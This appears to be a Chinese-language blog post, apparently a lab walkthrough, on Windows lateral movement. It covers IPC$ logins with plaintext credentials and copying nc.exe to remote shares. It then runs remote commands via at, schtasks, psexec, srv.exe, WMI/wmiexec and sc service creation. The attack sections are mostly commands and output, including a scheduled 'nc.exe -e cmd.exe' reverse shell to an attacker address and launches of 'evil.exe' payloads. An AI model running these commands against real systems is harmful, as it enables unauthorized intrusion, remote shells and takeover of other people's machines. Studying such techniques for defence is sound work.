@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Task-Attack - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="一、IPC$登录以及文件的上传与下载 尝试IPC连接 出现了如下的错误，很有可能没有开启IPC共享 1 2 System error 1312 has occurred. A specified logon session does not exist. It may already have been terminated 连接成" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/task-attack/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Task-Attack" />
+<meta property="og:description" content="一、IPC$登录以及文件的上传与下载 尝试IPC连接 出现了如下的错误，很有可能没有开启IPC共享 1 2 System error 1312 has occurred. A specified logon session does not exist. It may already have been terminated 连接成" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/task-attack/" />
+<meta property="article:published_time" content="2018-02-07T18:56:08&#43;00:00"/>
+<meta property="article:modified_time" content="2018-02-07T18:56:08&#43;00:00"/>
+
+<meta itemprop="name" content="Task-Attack">
+<meta itemprop="description" content="一、IPC$登录以及文件的上传与下载 尝试IPC连接 出现了如下的错误，很有可能没有开启IPC共享 1 2 System error 1312 has occurred. A specified logon session does not exist. It may already have been terminated 连接成">
+
+
+<meta itemprop="datePublished" content="2018-02-07T18:56:08&#43;00:00" />
+<meta itemprop="dateModified" content="2018-02-07T18:56:08&#43;00:00" />
+<meta itemprop="wordCount" content="898">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Task-Attack"/>
+<meta name="twitter:description" content="一、IPC$登录以及文件的上传与下载 尝试IPC连接 出现了如下的错误，很有可能没有开启IPC共享 1 2 System error 1312 has occurred. A specified logon session does not exist. It may already have been terminated 连接成"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Task-Attack</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#一-ipc-登录以及文件的上传与下载">一、IPC$登录以及文件的上传与下载</a>
+<ul>
+<li><a href="#尝试ipc连接">尝试IPC连接</a></li>
+<li><a href="#连接成功">连接成功</a></li>
+<li><a href="#文件上传">文件上传</a></li>
+<li><a href="#文件下载">文件下载</a></li>
+</ul></li>
+<li><a href="#二-命令执行">二、命令执行</a>
+<ul>
+<li><a href="#2-1-计划任务之at命令">2.1 计划任务之AT命令</a></li>
+<li><a href="#2-2-schtasks">2.2 schtasks</a></li>
+<li><a href="#2-3-psexec">2.3 psexec</a></li>
+<li><a href="#2-4-srv">2.4 srv</a></li>
+<li><a href="#2-5-wmi">2.5 WMI</a></li>
+<li><a href="#2-6-其他">2.6 其他</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="一-ipc-登录以及文件的上传与下载">一、IPC$登录以及文件的上传与下载</h1>
+
+<h2 id="尝试ipc连接">尝试IPC连接</h2>
+
+<p>出现了如下的错误，很有可能没有开启IPC共享</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">System error 1312 has occurred.
+A specified logon session does not exist. It may already have been terminated</pre></td></tr></table>
+</div>
+</div>
+<h2 id="连接成功">连接成功</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">C:\Users\evi1ox\Desktop&gt;net use \\10.10.10.21\IPC$ 123456 /user:administrator
+net use \\10.10.10.21\IPC$ 123456 /user:administrator
+命令成功完成。</pre></td></tr></table>
+</div>
+</div>
+<h2 id="文件上传">文件上传</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">C:\Users\evi1ox\Desktop&gt;copy nc.exe \\10.10.10.21\C$\
+copy nc.exe \\10.10.10.21\C$\
+已复制         1 个文件。</pre></td></tr></table>
+</div>
+</div>
+<h2 id="文件下载">文件下载</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">C:\Users\evi1ox\Desktop&gt;copy \\10.10.10.21\C$\windows\system32\cmd.exe cmd.exe
+copy \\10.10.10.21\C$\windows\system32\cmd.exe cmd.exe
+已复制         1 个文件。</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_18-41-50.jpg" alt="" /></p>
+
+<h1 id="二-命令执行">二、命令执行</h1>
+
+<h2 id="2-1-计划任务之at命令">2.1 计划任务之AT命令</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">at \\10.10.10.21
+net time \\10.10.10.21
+copy evil.exe \\[HOST]\c$\windows\temp\evil.exe
+at \\10.10.10.21 18:51 C:\\nc.exe -e cmd.exe 10.10.10.2 2333
+at \\10.10.10.21 [id] /delete</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_18-52-06.jpg" alt="" /></p>
+
+<h2 id="2-2-schtasks">2.2 schtasks</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">命令
+schtasks /create /s 10.10.10.19 /u Administrator /p x /ru &#34;SYSTEM&#34; /tn adduser /sc DAILY /st 19:39 /tr c:\\add.bat /F
+结果
+SUCCESS: The scheduled task &#34;adduser&#34; has successfully been created.
+
+命令
+schtasks /run /s 10.10.10.19 /u Administrator /p x /tn adduser
+schtasks /delete /tn adduser /f /s [HOST]  # 清除 adduser
+结果
+SUCCESS: Attempted to run the scheduled task &#34;adduser&#34;.</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_19-42-01.jpg" alt="" /></p>
+
+<p><strong>优缺点对比</strong><br />
+&gt;2003测试失败<br />
+&gt;at命令很容易将计划任务安排到第二天去，哈哈你懂得<br />
+&gt;schtasks虽然强大，但是命令极为复杂</p>
+
+<h2 id="2-3-psexec">2.3 psexec</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">psexec \\10.10.10.19 C:\add.bat
+psexec.exe \\[HOST] –accepteula -u [USERNAME] -p [PASSWORD] -c evil.exe</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_19-53-24.jpg" alt="" /></p>
+
+<p><strong>可能失败原因</strong><br />
+* psexec需要对方开启ADMIN$共享<br />
+* 而且需要安装服务,默认关闭<br />
+* psexec退出时有可能服务删除失败</p>
+
+<h2 id="2-4-srv">2.4 srv</h2>
+
+<p>srv获取交互式shell<br />
+笔者的srv.exe始终没有上传成功(不能复制exe文件，或者有杀毒软件)，导致使用失败</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">at \\10.10.10.19 20:09 srv.exe
+telnet 10.10.10.19 5188(书上说端口是99,我看了看~~~其实是5188端口)</pre></td></tr></table>
+</div>
+</div>
+<p>本地测试成功，获取交互式shell<br />
+限制:很多win服务器没有开启telnet客户端服务<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-27_20-36-44.jpg" alt="" /></p>
+
+<h2 id="2-5-wmi">2.5 WMI</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">wmic /node:10.10.10.21 /user:administrator /password:123456 process call create C:\add.bat
+wmic /node:[HOST] /user:administrator /p [PASSWORD] process call create c:\windows\temp\evil.exe
+wmiexec.py administrator:password@10.10.10.21</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_20-14-28.jpg" alt="" /><br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-27_20-20-13.jpg" alt="" /><br />
+WMIEXEC.vbs获取半交互式shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.21 Administrator 123456
+cscript.exe wmiexec.vbs /cmd 10.10.10.21 administrator 123456 &#34;ipconfig&#34;</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-27_20-21-28.jpg" alt="" /></p>
+
+<h2 id="2-6-其他">2.6 其他</h2>
+
+<p>PsRemoting远程命令执行基于WinRM，WinRM指的是Windows远程管理服务，它会监听<strong>http(5985);https(5986)</strong>端口，Windows Server2012中该功能是默认启动，但2008或2008 R2则默认是禁用的,但是不排除管理员为了方便他们对服务器进行远程管理，会将这个端口开启。</p>
+
+<p>条件:两台电脑在相同域或信任域内的指定电脑<br />
+通过<strong>Enable-PSRemoting</strong>打开PS远程管理，启动了Kerberos认证<br />
+<code>Enter-PSSession 10.10.10.19 -Credential  administrator</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">(1). 系统权限(其中test为服务名)
+ sc \\[HOST] create boom binpath= c:\evil.exe
+ sc \\[HOST] start boom
+ sc \\[HOST] delete boom
+
+(2). 指定用户权限启动
+ sc \\[HOST] create boom binpath= c:\evil.exe obj= [DOMAIN]\administrator passwrod= [PASSWORD]
+ sc \\[HOST] start boom</pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/unauthorized-attack/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Unauthorized-Attack</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/powershell-clone-account/">
+            <span class="next-text nav-default">Powershell-Clone-Account</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
